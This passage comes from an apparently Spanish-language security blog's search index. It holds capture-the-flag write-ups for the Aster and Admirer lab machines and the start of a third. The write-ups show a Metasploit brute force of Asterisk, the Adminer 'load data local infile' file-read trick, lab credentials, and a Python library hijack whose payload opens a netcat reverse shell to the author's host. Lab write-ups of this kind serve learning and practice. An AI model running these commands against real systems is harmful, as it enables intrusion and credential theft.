200) /server-status (Status: 403) ASTERISK Entre los puertos que encontramos se encuentra Asterisk Call Manager 5.0.2 el cual permite que un usuario se conecte a este puerto y ejecute comandos o lea eventos. Al investigar sobre este \u0026ldquo;servicio/server\u0026rdquo; encontramos un post donde realizan un \u0026lsquo;Pentesting\u0026rsquo; a este servicio, primero utilizamos el modulo de metasploit use auxiliary/voip/asterisk_login el cual realiza un ataque de fuerza bruta, conociendo un nombre de usuario (admin) y utilizando los wordlist que vienen por defecto ejecutamos el modulo. Logrando encontrar la \u0026ldquo;contraseña\u0026rdquo; de este usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 msf5 \u0026gt; use auxiliary/voip/asterisk_login msf5 auxiliary(voip/asterisk_login) \u0026gt; set USERNAME admin USERNAME =\u0026gt; admin msf5 auxiliary(voip/asterisk_login) \u0026gt; set rhosts aster.thm rhosts =\u0026gt; aster.thm msf5 auxiliary(voip/asterisk_login) \u0026gt; show options Module options (auxiliary/voip/asterisk_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD no A specific password to authenticate with PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt no The file that contains a list of probable passwords. RHOSTS aster.thm yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5038 yes The target port (TCP) STOP_ON_SUCCESS true yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USERNAME admin no A specific username to authenticate as USERPASS_FILE no File containing users and passwords separated by space, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt no The file that contains a list of probable users accounts. VERBOSE true yes Whether to print output for all attempts msf5 auxiliary(voip/asterisk_login) \u0026gt; set stop_on_success true stop_on_success =\u0026gt; true msf5 auxiliary(voip/asterisk_login) \u0026gt; msf5 auxiliary(voip/asterisk_login) \u0026gt; run [*] 10.10.160.101:5038 - Initializing module... [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;admin\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;123456\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;12345\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;123456789\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;password\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;iloveyou\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;princess\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;1234567\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;12345678\u0026#39; [+] 10.10.160.101:5038 - User: \u0026#34;admin\u0026#34; using pass: \u0026#34;[... REDACTED ...]\u0026#34; - can login on 10.10.160.101:5038! [!] 10.10.160.101:5038 - No active DB -- Credential data will not be saved! [*] aster.thm:5038 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf5 auxiliary(voip/asterisk_login) \u0026gt; Nos conectamos a este servicio utilizando telnet pasando las credenciales para autenticarnos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kali@kali:~/thm/aster$ telnet aster.thm 5038 Trying 10.10.160.101... Connected to aster.thm. Escape character is \u0026#39;^]\u0026#39;. Asterisk Call Manager/5.0.2 Action: Login Username: admin Secret: [... REDACTED ...] Response: Success Message: Authentication accepted Event: FullyBooted Privilege: system,all Uptime: 5368 LastReload: 5368 Status: Fully Booted HARRY - USER Enumeramos informacion SIP el cual contiene usuarios, \u0026ldquo;contraseñas\u0026rdquo; (secrets) y extensiones. Vemos que tenemos la \u0026ldquo;contraseña\u0026rdquo; del usuario harry, utilizamos esta en el servicio SSH y logramos obtener una shell y nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 Action: command Command: sip show users Response: Success Message: Command output follows Output: Username Secret Accountcode Def.Context ACL Forcerport Output: 100 100 test No No Output: 101 101 test No No Output: harry [... REDACTED ...] test No No ROOT FLAG Dentro de la carpeta de harry encontramos el archivo Example_Root.jar el cual decompilamos utilizando JavaDecompilers y encontramos que el codigo valida que el archivo /tmp/flag.dat existe, en tal caso escribe dentro de del archivo /home/harry/root.txt la cadena my secret \u0026lt;3 baby.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import java.io.IOException; import java.io.FileWriter; import java.io.File; // // Decompiled by Procyon v0.5.36 // public class Example_Root { public static boolean isFileExists(final File file) { return file.isFile(); } public static void main(final String[] array) { final File file = new File(\u0026#34;/tmp/flag.dat\u0026#34;); try { if (isFileExists(file)) { final FileWriter fileWriter = new FileWriter(\u0026#34;/home/harry/root.txt\u0026#34;); fileWriter.write(\u0026#34;my secret \u0026lt;3 baby\u0026#34;); fileWriter.close(); System.out.println(\u0026#34;Successfully wrote to the file.\u0026#34;); } } catch (IOException ex) { System.out.println(\u0026#34;An error occurred.\u0026#34;); ex.printStackTrace(); } } } Realizamos una enumeracion en la maquina y encontramos dos cron que se ejecutan como usuario root\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 harry@ubuntu:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user\tcommand 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly * *\t* * *\troot\tcd /opt/ \u0026amp;\u0026amp; bash ufw.sh 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) * *\t* * *\troot\tcd /root/java/ \u0026amp;\u0026amp; bash run.sh # El primero ejecuta ufw, el segundo al parecer ejecuta algun archivo java.\n1 ufw disable Utilizamos pspy para ver que comandos se ejecutan tomando encuenta el segundo cron. Vemos que posiblemente el archivo run.sh ejecuta java -jar root.jar que se encuentra en la carpeta /root/java/.\nSi tomamos encuenta que el archivo Example_Root.jar solo es un ejemplo, quizas el archivo root.jar es el original y realiza la escritura en /home/harry/root.txt de algun string y posiblemente nuestra flag root.txt. Para comprobar esto vamos a crear el archivo /tmp/flag.dat y esperar a que el cron se ejecute.\n1 touch /tmp/flag.dat Logramos obtener nuestra flag root.txt.\n","description":"Aster es una maquina de TryHackMe, realizamos un ataque de fuerza bruta al login de Asterisk seguidamente obtuvimos credenciales que nos dieron acceso a la maquina. Un archivo JAR y enumeracion de cronjobs nos permitió leer la flag root.txt.","id":92,"section":"posts","tags":["uncompyle6","asterisk","metasploit","telnet","java","jar","pspy","java decompiler"],"title":"TryHackMe - Aster","uri":"https://sckull.github.io/posts/aster/"},{"content":"\rAdmirer de HTB. En la pagina web encontramos credenciales que dieron acceso al servicio FTP, en este ultimo vemos el codigo fuente dentro de un \u0026ldquo;backup\u0026rdquo; el cual nos guió y dio acceso a la base de datos Admirer, misma que conectamos a nuestra maquina para explotar una vulnerabilidad que nos dio acceso a la maquina. Realizando Python Library Hijacking obtuvimos acceso como root.\nInformacion de la Maquina Nombre Admirer OS Linux Puntos 20 Dificultad Facil IP 10.10.10.187 Maker polarbearer GibParadox Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[8, 5.7, 6, 4, 4.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[9, 8, 8, 2, 2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # Nmap 7.80 scan initiated Mon Sep 14 17:51:23 2020 as: nmap -p- --min-rate 1000 -o allports 10.10.10.187 Warning: 10.10.10.187 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.187 (10.10.10.187) Host is up (0.072s latency). Not shown: 64347 closed ports, 1185 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Mon Sep 14 17:53:40 2020 -- 1 IP address (1 host up) scanned in 136.74 seconds # Nmap 7.80 scan initiated Mon Sep 14 17:54:29 2020 as: nmap -sV -sC -p21,22,80 -o serviceports 10.10.10.187 Nmap scan report for 10.10.10.187 (10.10.10.187) Host is up (0.16s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA) | 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA) |_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/admin-dir |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Admirer Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Sep 14 17:54:44 2020 -- 1 IP address (1 host up) scanned in 15.78 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 kali@kali:~/htb/admirer$ gobuster dir -u admirer.htb -w /usr/share/wordlists/dirb/common.txt -q -x txt,php,html -t 15 /assets (Status: 301) /images (Status: 301) /index.php (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) Encontramos una direccion que contiene informacion personal y un nombre \u0026ldquo;waldo\u0026rdquo;.\n1 2 3 4 User-agent: * # This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo Disallow: /admin-dir Ejecutamos nuevamente gobuster en este nueva directorio.\n1 2 3 kali@kali:~/htb/admirer$ gobuster dir -u admirer.htb/admin-dir/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -x txt,php,html -t 15 /contact.txt (Status: 200) /credentials.txt (Status: 200) Encontramos dos archivos en uno vemos correos y en el otro contraseñas.\ncontact.txt\rcredentials.txt\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ########## # admins # ########## # Penny Email: p.wise@admirer.htb ############## # developers # ############## # Rajesh Email: r.nayyar@admirer.htb # Amy Email: a.bialik@admirer.htb # Leonard Email: l.galecki@admirer.htb ############# # designers # ############# # Howard Email: h.helberg@admirer.htb # Bernadette Email: b.rauch@admirer.htb 1 2 3 4 5 6 7 8 9 10 11 [Internal mail account] w.cooper@admirer.htb fgJr6q#S\\W:$P [FTP account] ftpuser %n?4Wz}R$tTF7 [Wordpress account] admin w0rdpr3ss01! FTP Utilizamos las credenciales en el servicio FTP, en donde encontramos dos archivos html.tar.gz y dump.sql.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 kali@kali:~/htb/admirer$ ftp admirer.htb Connected to admirer.htb. 220 (vsFTPd 3.0.3) Name (admirer.htb:kali): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-x--- 2 0 111 4096 Dec 03 2019 . drwxr-x--- 2 0 111 4096 Dec 03 2019 .. -rw-r--r-- 1 0 0 3405 Dec 02 2019 dump.sql -rw-r--r-- 1 0 0 5270987 Dec 03 2019 html.tar.gz 226 Directory send OK. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; get dump.sql local: dump.sql remote: dump.sql 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for dump.sql (3405 bytes). 226 Transfer complete. 3405 bytes received in 0.00 secs (1.8346 MB/s) ftp\u0026gt; get html.tar.gz local: html.tar.gz remote: html.tar.gz 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes). 226 Transfer complete. 5270987 bytes received in 7.27 secs (707.7599 kB/s) ftp\u0026gt; El archivo dump.sql no tiene nada interesante, el archivo html.tar.gz contiene el codigo fuente de la pagina que se muestra en el puerto 80.\n1 2 3 4 5 6 7 8 9 10 drwxr-xr-x 6 kali kali 4.0K Sep 14 18:20 . drwxr-xr-x 3 kali kali 4.0K Sep 14 18:25 .. drwxr-x--- 6 kali kali 4.0K Jun 6 2019 assets -rw-r--r-- 1 kali kali 3.4K Sep 14 18:18 dump.sql -rw-r--r-- 1 kali kali 5.1M Sep 14 18:18 html.tar.gz drwxr-x--- 4 kali kali 4.0K Dec 2 2019 images -rw-r----- 1 kali kali 4.6K Dec 3 2019 index.php -rw-r----- 1 kali kali 134 Dec 1 2019 robots.txt drwxr-x--- 2 kali kali 4.0K Dec 2 2019 utility-scripts drwxr-x--- 2 kali kali 4.0K Dec 2 2019 w4ld0s_s3cr3t_d1r Entre los archivos, encontramos varias contraseñas de waldo, además de ello vemos una carpeta nueva utility-scripts en la cual se encuentra una pagina que se muestran las tareas que se encuentran en /opt/scripts/admin_tasks.sh. Tambien vemos 4 opciones que \u0026ldquo;no estan disponibles\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Administrative Tasks\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h3\u0026gt;Admin Tasks Web Interface (v0.01 beta)\u0026lt;/h3\u0026gt; \u0026lt;?php // Web Interface to the admin_tasks script // if(isset($_REQUEST[\u0026#39;task\u0026#39;])) { $task = $_REQUEST[\u0026#39;task\u0026#39;]; if($task == \u0026#39;1\u0026#39; || $task == \u0026#39;2\u0026#39; || $task == \u0026#39;3\u0026#39; || $task == \u0026#39;4\u0026#39; || $task == \u0026#39;5\u0026#39; || $task == \u0026#39;6\u0026#39; || $task == \u0026#39;7\u0026#39;) { /*********************************************************************************** Available options: 1) View system uptime 2) View logged in users 3) View crontab (current user only) 4) Backup passwd file (not working) 5) Backup shadow file (not working) 6) Backup web data (not working) 7) Backup database (not working) NOTE: Options 4-7 are currently NOT working because they need root privileges. I\u0026#39;m leaving them in the valid tasks in case I figure out a way to securely run code as root from a PHP page. ************************************************************************************/ echo str_replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026lt;br /\u0026gt;\u0026#34;, shell_exec(\u0026#34;/opt/scripts/admin_tasks.sh $task 2\u0026gt;\u0026amp;1\u0026#34;)); } else { echo(\u0026#34;Invalid task.\u0026#34;); } } ?\u0026gt; \u0026lt;p\u0026gt; \u0026lt;h4\u0026gt;Select task:\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;select name=\u0026#34;task\u0026#34;\u0026gt; \u0026lt;option value=1\u0026gt;View system uptime\u0026lt;/option\u0026gt; \u0026lt;option value=2\u0026gt;View logged in users\u0026lt;/option\u0026gt; \u0026lt;option value=3\u0026gt;View crontab\u0026lt;/option\u0026gt; \u0026lt;option value=4 disabled\u0026gt;Backup passwd file\u0026lt;/option\u0026gt; \u0026lt;option value=5 disabled\u0026gt;Backup shadow file\u0026lt;/option\u0026gt; \u0026lt;option value=6 disabled\u0026gt;Backup web data\u0026lt;/option\u0026gt; \u0026lt;option value=7 disabled\u0026gt;Backup database\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; En este punto ya no encontramos nada interesante en la pagina ya que algunos archivos fueron reemplazados con mejores opciones como db_admin.php en el que indica que implementaron una mejor alternativa de codigo abierto:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;waldo\u0026#34;; $password = \u0026#34;Wh3r3_1s_w4ld0?\u0026#34;; // Create connection $conn = new mysqli($servername, $username, $password); // Check connection if ($conn-\u0026gt;connect_error) { die(\u0026#34;Connection failed: \u0026#34; . $conn-\u0026gt;connect_error); } echo \u0026#34;Connected successfully\u0026#34;; // TODO: Finish implementing this or find a better open source alternative ?\u0026gt; Utilizamos nuevamente GOBUSTER para realizar una busqueda pero esta vez en utility-scripts.\n1 2 3 4 kali@kali:~/htb/admirer$ gobuster dir -u http://admirer.htb/utility-scripts/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -t 25 -x php,html,txt /adminer.php (Status: 200) /info.php (Status: 200) /phptest.php (Status: 200) Encontramos a Adminer una herramienta para administrar bases de datos donde logramos ver el login.\nIntenamos utilizar las credenciales que encontramos en el \u0026ldquo;backup\u0026rdquo; de la pagina web pero ninguno funciono. Exploramos las vulnerabilidades de Adminer y encontramos que es posible conectar una base de datos externa y con esta conexion leer archivos de la maquina. Lo primero que hay que realizar es configurar una base de datos en nuestra maquina en MySQL.\n1 2 3 4 5 6 7 8 9 10 11 12 13 #Database CREATE DATABASE sckull; USE sckull; #Table create TABLE file(data varchar(1000)); #User CREATE USER \u0026#39;sckull\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;sckull\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;sckull\u0026#39;@\u0026#39;%\u0026#39;; FLUSH PRIVILEGES; #Test mysql -h 10.10.10.10 -u sckull -p sckull Luego de ello debemos de conectarnos a nuestra base de datos utilizando Adminer con las credenciales, la IP de nuestra maquina y nombre de la base de datos que creamos.\nEjecutamos un query para ralizar la lectura del archivo admirer.php y vemos su codigo fuente.\n1 2 3 load data local infile \u0026#39;admirer.php\u0026#39; into table file fields terminated by \u0026#39;\\n\u0026#39; Despues de realizar una enumeracion logramos obtener algunas credenciales del archivo index.php.\n1 2 3 4 5 6 7 8 [... REDACTED ...] $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;waldo\u0026#34;; $password = \u0026#34;\u0026amp;\u0026lt;h5b~yK3F#{PaPB\u0026amp;dA}{H\u0026gt;\u0026#34;; $dbname = \u0026#34;admirerdb\u0026#34;; [... REDACTED ...] WALDO - USER Utilizamos estas credenciales en el servicio ssh y logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos para ejecutar el comando /opt/scripts/admin_tasks.sh.\nEl archivo admin_tasks.sh realiza un backup de diferentes archivos como /etc/passwd, /etc/shadow, pero algo interesante es de que realiza la ejecucion de un script en python.\n1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/bash backup_web() { if [ \u0026#34;$EUID\u0026#34; -eq 0 ] then echo \u0026#34;Running backup script in the background, it might take a while...\u0026#34; /opt/scripts/backup.py \u0026amp; else echo \u0026#34;Insufficient privileges to perform the selected operation.\u0026#34; fi } En este script logramos ver que importa la libreria shutil especificamente una de sus funciones make_archive().\n1 2 3 4 5 6 7 8 9 10 11 12 #!/usr/bin/python3 from shutil import make_archive src = \u0026#39;/var/www/html/\u0026#39; # old ftp directory, not used anymore #dst = \u0026#39;/srv/ftp/html\u0026#39; dst = \u0026#39;/var/backups/html\u0026#39; make_archive(dst, \u0026#39;gztar\u0026#39;, src) Vamos a realizar Python Library Hijacking al igual que en THM - Ghizer pero con una shell diferente y utilizando la variable PYTHONPATH ya que no tenemos permisos en la carpeta donde estan estos scripts y es necesario para ejecutar el comando.\nCreamos el archivo en /dev/shm/, puede ser en cualquier otra carpeta con permisos de escritura:\n1 2 3 4 import os def make_archive(no, one, this):\tos.system(\u0026#34;nc -e /bin/sh 10.10.15.75 1338\u0026#34;) Ejecutamos y seleccionamos la opcion 6, donde esta el script de python:\n1 sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh Logramos obtener una shell con usuario root y nuestra flag root.txt.\n","description":"Admirer de HTB. En la pagina web encontramos credenciales que dieron acceso al servicio FTP, en este ultimo vemos el codigo fuente dentro de un \"backup\" el cual nos guió y dio acceso a la base de datos Admirer, misma que conectamos a nuestra maquina para explotar una vulnerabilidad que nos dio acceso a la maquina. Realizando Python Library Hijacking obtuvimos acceso como root.","id":93,"section":"posts","tags":["ftp","adminer","python library hijacking","nmap","gobuster","python"],"title":"Hack The Box - Admirer","uri":"https://sckull.github.io/posts/admirer/"},{"content":"\rFor Business Reason es una maquina de TryHackMe, realizamos un ataque de contraseñas al login de WordPress para luego instalar un Plugin y obtener una shell. Nos encontramos en un contenedor de Docker donde realizamos un escaneo de la red para luego ejecutar un Tunnel con Chisel y obtener el puerto SSH que nos permitio ingresar reutilizando credenciales. Finalmente escalamos privilegios creando un nuevo contenedor con LXC.\nRoom Titulo For Business Reasons Descripción In your network scan, you found an unknown VM\u0026hellip;. Puntos 190 Dificultad Dificil Maker MsMouse NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) abierto, desconocido (7946) y el puerto ssh (22) aparentemente cerrado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # Nmap 7.80 scan initiated Sat Sep 19 21:19:12 2020 as: nmap -p- --min-rate 1000 -o allports bussines.thm Nmap scan report for bussines.thm (10.10.85.176) Host is up (0.36s latency). Not shown: 65532 filtered ports PORT STATE SERVICE 22/tcp closed ssh 80/tcp open http 7946/tcp closed unknown # Nmap done at Sat Sep 19 21:21:24 2020 -- 1 IP address (1 host up) scanned in 132.07 seconds # Nmap 7.80 scan initiated Sat Sep 19 21:21:51 2020 as: nmap -sV -sC -p 22,80,7946 -o servicesport bussines.thm Nmap scan report for bussines.thm (10.10.85.176) Host is up (0.29s latency). PORT STATE SERVICE VERSION 22/tcp closed ssh 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-generator: WordPress 5.4.2 | http-robots.txt: 1 disallowed entry |_/wp-admin/ |_http-server-header: Apache/2.4.38 (Debian) |_http-title: MilkCo Test/POC site \u0026amp;#8211; Just another WordPress site 7946/tcp closed unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Sep 19 21:22:13 2020 -- 1 IP address (1 host up) scanned in 21.70 seconds HTTP Encontramos una pagina web WordPress en el puerto 80.\nRUSTBUSTER Utilizamos RUSTBUSTER para busqueda de directorios y archivos, en donde podemos observar varias direcciones las cuales se muestran diferentes a lo normal pero que son direcciones no disponibles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 kali@kali:~/thm/bussiness$ /opt/rustbuster/rustbuster dir -u http://10.10.141.160 -w /usr/share/seclists/Discovery/Web-Content/big.txt -e php,html,txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ _ _ _ _ _ _ _ _ _ _ /\\ \\ /\\_\\ / /\\ /\\ \\ / /\\ /\\_\\ / /\\ /\\ \\ /\\ \\ /\\ \\ / \\ \\/ / / _ / / \\ \\_\\ \\ / / \\ / / / _ / / \\ \\_\\ \\ / \\ \\ / \\ \\ / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / /\\ \\ \\ / /\\ \\ \\ / / /\\ \\_\\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\ \\ \\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\_\\ / / /\\ \\_\\ / / /_/ / /\\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ / /\\ \\_\\ \\ \\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ /_/_ \\/_/ / / /_/ / / / / /__\\/ / / / / / / / \\ \\ \\ / / / \\/_/ / /\\ \\ \\___\\ / / / / / / \\ \\ \\ / / / \\/_/ /____/\\ / / /__\\/ / / / /_____/ / / / / / _ \\ \\ \\ / / / / / / \\ \\ \\__// / / / / _ \\ \\ \\ / / / / /\\____\\/ / / /_____/ / / /\\ \\ \\ / / /___/ / /_/\\__/ / / / / / / / /____\\_\\ \\ / / /___/ / /_/\\__/ / / / / / / / /______ / / /\\ \\ \\ / / / \\ \\ \\/ / /____\\/ /\\ \\/___/ / /_/ / / / /__________/ / /____\\/ /\\ \\/___/ / /_/ / / / /_______/ / / \\ \\ \\ \\/_/ \\_\\/\\/_________/ \\_____\\/ \\_\\/ \\/_____________\\/_________/ \\_____\\/ \\_\\/ \\/__________\\/_/ \\_\\/ [?] Started at\t: 2020-09-19 21:25:08 GET\t301 Moved Permanently\thttp://10.10.141.160/! =\u0026gt; http://10.10.141.160/ GET 301 Moved Permanently http://10.10.141.160/0 =\u0026gt; http://10.10.141.160/0/ GET 301 Moved Permanently http://10.10.141.160/0000 =\u0026gt; http://10.10.141.160/0000/ GET 301 Moved Permanently http://10.10.141.160/2020 =\u0026gt; http://10.10.141.160/2020/ GET 301 Moved Permanently http://10.10.141.160/asdfjkl; =\u0026gt; http://10.10.141.160/asdfjkl GET 301 Moved Permanently http://10.10.141.160/atom =\u0026gt; http://10.10.141.160/feed/atom/ GET 301 Moved Permanently http://10.10.141.160/embed =\u0026gt; http://10.10.141.160/embed/ GET 302 Found http://10.10.141.160/favicon.ico =\u0026gt; http:/wp-includes/images/w-logo-blue-white-bg.png GET 301 Moved Permanently http://10.10.141.160/feed =\u0026gt; http://10.10.141.160/feed/ GET 301 Moved Permanently http://10.10.141.160/fixed! =\u0026gt; http://10.10.141.160/fixed GET 200 OK http://10.10.141.160/images GET 301 Moved Permanently http://10.10.141.160/index.php =\u0026gt; http://10.10.141.160/ GET 200 OK http://10.10.141.160/license.txt GET 403 Forbidden http://10.10.141.160/lost%2Bfound GET 403 Forbidden http://10.10.141.160/lost+found GET 301 Moved Permanently http://10.10.141.160/mysql =\u0026gt; http://10.10.141.160/mysql/ GET 200 OK http://10.10.141.160/note.txt GET 301 Moved Permanently http://10.10.141.160/page1 =\u0026gt; http://10.10.141.160/ GET 301 Moved Permanently http://10.10.141.160/rdf =\u0026gt; http://10.10.141.160/feed/rdf/ GET 200 OK http://10.10.141.160/readme.html GET 200 OK http://10.10.141.160/robots.txt GET 200 OK http://10.10.141.160/robots.txt GET 301 Moved Permanently http://10.10.141.160/rss =\u0026gt; http://10.10.141.160/feed/ GET 301 Moved Permanently http://10.10.141.160/rss2 =\u0026gt; http://10.10.141.160/feed/ GET 301 Moved Permanently 